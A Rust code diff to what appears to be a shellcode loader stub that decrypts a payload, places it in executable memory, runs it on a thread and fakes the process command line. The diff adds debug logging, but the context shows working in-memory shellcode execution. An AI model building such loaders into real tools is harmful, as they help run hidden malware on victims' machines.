@@ -19,7 +19,7 @@ type ShellcodeEntry = unsafe extern "system" fn() -> u32;
 /// Errors produced while running shellcode.
 #[derive(Debug, thiserror::Error)]
 enum ShellcodeError {
-    #[error("the shellcode payload is empty")]
+    #[error("the payload is empty")]
     Empty,
     #[error("could not allocate executable memory (status 0x{0:08x})")]
     AllocateFailed(i32),
@@ -67,6 +67,11 @@ fn run_shellcode(shellcode: &[u8]) -> Result<i32, ShellcodeError> {
         if status < 0 {
             return Err(ShellcodeError::AllocateFailed(status));
         }
+        crate::tech_dbg!(
+            "reflective_loading",
+            "shellcode region allocated at {base:p} ({} bytes)",
+            shellcode.len()
+        );
 
         ptr::copy_nonoverlapping(shellcode.as_ptr(), base as *mut u8, shellcode.len());
 
@@ -85,11 +90,16 @@ fn run_shellcode(shellcode: &[u8]) -> Result<i32, ShellcodeError> {
             drop(Box::from_raw(ctx));
             ShellcodeError::ThreadCreationFailed
         })?;
+        crate::tech_dbg!("reflective_loading", "shellcode thread started");
 
         WaitForSingleObject(thread, u32::MAX);
         let mut exit_code = 0u32;
         let _ = GetExitCodeThread(thread, &mut exit_code);
         let _ = CloseHandle(thread);
+        crate::tech_dbg!(
+            "reflective_loading",
+            "shellcode thread exited with {exit_code}"
+        );
         // The thread has finished, so the trampoline no longer reads the
         // context; safe to free it here.
         drop(Box::from_raw(ctx));
@@ -101,6 +111,11 @@ fn run_shellcode(shellcode: &[u8]) -> Result<i32, ShellcodeError> {
 /// Adapter expected by the stub skeleton (`run()` calls this with the
 /// decrypted payload).
 fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
+    crate::tech_dbg!(
+        "reflective_loading",
+        "running {} bytes of shellcode in-process",
+        image.len()
+    );
     // Shellcode has no PE entry point that reads a command line, but it runs in
     // *this* process: repoint the PEB command line at `<exe> <yaml args>
     // <runtime args>` first, so shellcode that reads it (via `GetCommandLineW`)
